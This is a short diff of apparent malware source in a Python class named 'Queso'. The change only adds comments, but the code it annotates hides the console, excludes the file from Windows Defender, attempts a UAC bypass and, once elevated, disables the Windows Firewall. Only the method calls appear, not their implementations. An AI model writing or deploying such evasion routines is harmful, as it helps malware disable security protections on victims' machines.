@@ -182,6 +182,7 @@ class Queso:
             
         )
 
+        # Hide the console and exclude this file from Windows Defender
         Syscalls.HideConsole()
         Utility.ExcludeFromDefender()
 
@@ -190,6 +191,8 @@ class Queso:
                     Utility.UACbypass()
 
         if Utility.IsAdmin(): # We're admin now
+
+            # Disable Windows Firewall and exclude this file
             Network.DisableFirewall()
             Network.ExcludeFromFirewall()
 
